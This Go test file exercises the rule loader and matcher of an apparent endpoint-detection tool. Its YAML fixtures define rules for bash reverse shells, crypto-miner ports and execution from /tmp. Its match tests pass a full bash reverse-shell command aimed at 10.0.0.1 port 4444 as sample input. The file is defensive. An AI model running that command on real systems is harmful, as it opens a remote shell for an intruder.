package rule

import (
	"os"
	"path/filepath"
	"testing"

	"go.uber.org/zap"
	"go.uber.org/zap/zaptest"
)

func testLogger(t *testing.T) *zap.Logger {
	return zaptest.NewLogger(t)
}

func writeRuleFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

const ruleReverseShell = `
schema_version: 1
id: MXEDR-0001
name: reverse_shell_bash
version: 1
category: process
severity: critical
agent:
  enabled: true
  action: alert
  enforce: false
  match:
    event_type: process_exec
    conditions:
      - field: cmdline
        op: contains
        value: "/dev/tcp/"
      - field: cmdline
        op: contains
        value: "0>&1"
    logic: and
`

const ruleCryptoMiner = `
schema_version: 1
id: MXEDR-0002
name: crypto_miner_port
version: 1
category: network
severity: high
agent:
  enabled: true
  action: kill
  enforce: false
  match:
    event_type: tcp_connect
    conditions:
      - field: remote_port
        op: in
        values: ["3333", "4444", "5555"]
    logic: and
`

const ruleTmpExec = `
schema_version: 1
id: MXEDR-0003
name: tmp_execution
version: 1
category: process
severity: medium
agent:
  enabled: true
  action: alert
  enforce: false
  match:
    event_type: process_exec
    conditions:
      - field: exe
        op: starts_with
        value: "/tmp/"
    logic: and
`

const ruleServerOnly = `
schema_version: 1
id: MXEDR-0099
name: server_only_rule
version: 1
category: process
severity: low
agent:
  enabled: false
`

func TestManagerLoad(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "reverse-shell.yml", ruleReverseShell)
	writeRuleFile(t, dir, "crypto-miner.yaml", ruleCryptoMiner)
	writeRuleFile(t, dir, "tmp-exec.yml", ruleTmpExec)
	writeRuleFile(t, dir, "server-only.yml", ruleServerOnly)
	writeRuleFile(t, dir, "readme.txt", "not a rule file") // Ignored.

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	rs := m.Rules()

	// 4 rules total (including server-only).
	if got := len(rs.All); got != 4 {
		t.Errorf("All count = %d, want 4", got)
	}
	// 3 agent-enabled.
	if rs.Count != 3 {
		t.Errorf("Count = %d, want 3", rs.Count)
	}
	// 2 indexed under process_exec.
	if got := len(rs.ByEventType["process_exec"]); got != 2 {
		t.Errorf("process_exec rules = %d, want 2", got)
	}
	// 1 indexed under tcp_connect.
	if got := len(rs.ByEventType["tcp_connect"]); got != 1 {
		t.Errorf("tcp_connect rules = %d, want 1", got)
	}
	// No load errors.
	if len(rs.LoadErrors) != 0 {
		t.Errorf("LoadErrors = %v", rs.LoadErrors)
	}
}

func TestManagerLoadWithErrors(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "good.yml", ruleReverseShell)
	writeRuleFile(t, dir, "bad.yml", `id: ""`) // Missing required fields.
	writeRuleFile(t, dir, "broken.yml", `{invalid yaml`)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err) // Directory readable, should not error.
	}

	rs := m.Rules()
	if len(rs.All) != 1 {
		t.Errorf("expected 1 valid rule, got %d", len(rs.All))
	}
	if len(rs.LoadErrors) != 2 {
		t.Errorf("expected 2 load errors, got %d: %v", len(rs.LoadErrors), rs.LoadErrors)
	}
}

func TestManagerLoadDuplicateID(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "a.yml", ruleReverseShell)
	writeRuleFile(t, dir, "b.yml", ruleReverseShell) // Same ID.

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	rs := m.Rules()
	if len(rs.All) != 1 {
		t.Errorf("expected 1 rule (dedup), got %d", len(rs.All))
	}
	if len(rs.LoadErrors) != 1 {
		t.Errorf("expected 1 duplicate error, got %d", len(rs.LoadErrors))
	}
}

func TestManagerLoadEmptyDir(t *testing.T) {
	dir := t.TempDir()
	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}
	rs := m.Rules()
	if len(rs.All) != 0 {
		t.Error("expected empty rule set")
	}
}

func TestManagerLoadBadDir(t *testing.T) {
	m := NewManager(testLogger(t), "/nonexistent/path")
	if err := m.Load(); err == nil {
		t.Error("expected error for missing directory")
	}
}

func TestManagerMatchAND(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "reverse-shell.yml", ruleReverseShell)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	// Both conditions match.
	matched := m.Match("process_exec", map[string]string{
		"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"exe":     "/bin/bash",
	})
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}
	if matched[0].ID != "MXEDR-0001" {
		t.Errorf("matched rule ID = %q", matched[0].ID)
	}

	// Only first condition matches (AND requires both).
	matched = m.Match("process_exec", map[string]string{
		"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444",
	})
	if len(matched) != 0 {
		t.Error("expected no match when second condition fails")
	}

	// Wrong event type.
	matched = m.Match("file_open", map[string]string{
		"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	})
	if len(matched) != 0 {
		t.Error("expected no match for wrong event_type")
	}
}

func TestManagerMatchIN(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "miner.yml", ruleCryptoMiner)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	// Port in list.
	matched := m.Match("tcp_connect", map[string]string{
		"remote_port": "3333",
		"exe":         "/tmp/xmrig",
	})
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}

	// Port not in list.
	matched = m.Match("tcp_connect", map[string]string{
		"remote_port": "8080",
	})
	if len(matched) != 0 {
		t.Error("expected no match for port 8080")
	}
}

func TestManagerMatchMultipleRules(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "reverse-shell.yml", ruleReverseShell)
	writeRuleFile(t, dir, "tmp-exec.yml", ruleTmpExec)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	// Matches tmp-exec only.
	matched := m.Match("process_exec", map[string]string{
		"exe":     "/tmp/evil",
		"cmdline": "innocent",
	})
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}
	if matched[0].ID != "MXEDR-0003" {
		t.Errorf("expected MXEDR-0003, got %s", matched[0].ID)
	}
}

func TestManagerMatchOR(t *testing.T) {
	dir := t.TempDir()

	orRule := `
schema_version: 1
id: MXEDR-OR01
name: suspicious_shell
version: 1
category: process
severity: medium
agent:
  enabled: true
  action: alert
  match:
    event_type: process_exec
    conditions:
      - field: exe
        op: equals
        value: /bin/bash
      - field: exe
        op: equals
        value: /bin/sh
    logic: or
`
	writeRuleFile(t, dir, "or-rule.yml", orRule)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	// First condition matches → OR short-circuits.
	matched := m.Match("process_exec", map[string]string{"exe": "/bin/bash"})
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}

	// Second condition matches.
	matched = m.Match("process_exec", map[string]string{"exe": "/bin/sh"})
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}

	// Neither matches.
	matched = m.Match("process_exec", map[string]string{"exe": "/usr/bin/python"})
	if len(matched) != 0 {
		t.Error("expected no match")
	}
}

func TestConditionSortByCost(t *testing.T) {
	conditions := []Condition{
		{Field: "a", Op: OpRegex, Value: ".*", cost: 10},
		{Field: "b", Op: OpEquals, Value: "x", cost: 1},
		{Field: "c", Op: OpContains, Value: "y", cost: 3},
	}
	sortConditionsByCost(conditions)

	if conditions[0].Op != OpEquals {
		t.Errorf("first should be equals, got %s", conditions[0].Op)
	}
	if conditions[1].Op != OpContains {
		t.Errorf("second should be contains, got %s", conditions[1].Op)
	}
	if conditions[2].Op != OpRegex {
		t.Errorf("third should be regex, got %s", conditions[2].Op)
	}
}

func TestManagerAtomicSwap(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "rule.yml", ruleReverseShell)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	rs1 := m.Rules()
	if rs1.Count != 1 {
		t.Fatal("expected 1 rule")
	}

	// Add another rule and reload.
	writeRuleFile(t, dir, "miner.yml", ruleCryptoMiner)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	rs2 := m.Rules()
	if rs2.Count != 2 {
		t.Errorf("expected 2 rules after reload, got %d", rs2.Count)
	}

	// Old snapshot still valid (immutable).
	if rs1.Count != 1 {
		t.Error("old snapshot mutated")
	}
}

func TestManagerRollback(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "rule.yml", ruleReverseShell)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}
	if m.Rules().Count != 1 {
		t.Fatal("expected 1 rule")
	}

	// No previous → rollback fails.
	if m.Rollback() {
		t.Error("rollback should fail when no previous")
	}

	// Add rule and reload.
	writeRuleFile(t, dir, "miner.yml", ruleCryptoMiner)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}
	if m.Rules().Count != 2 {
		t.Fatal("expected 2 rules")
	}

	// Rollback to previous (1 rule).
	if !m.Rollback() {
		t.Fatal("rollback should succeed")
	}
	if m.Rules().Count != 1 {
		t.Errorf("after rollback: count = %d, want 1", m.Rules().Count)
	}

	// Rollback again → forward to 2 rules.
	if !m.Rollback() {
		t.Fatal("double rollback should succeed (swap back)")
	}
	if m.Rules().Count != 2 {
		t.Errorf("after double rollback: count = %d, want 2", m.Rules().Count)
	}
}

func TestManagerVersion(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "a.yml", ruleReverseShell)
	writeRuleFile(t, dir, "b.yml", ruleCryptoMiner)

	m := NewManager(testLogger(t), dir)
	if err := m.Load(); err != nil {
		t.Fatal(err)
	}

	rs := m.Rules()
	if rs.Version == "" {
		t.Error("version should not be empty")
	}
	if rs.Count != 2 {
		t.Errorf("count = %d", rs.Count)
	}
}
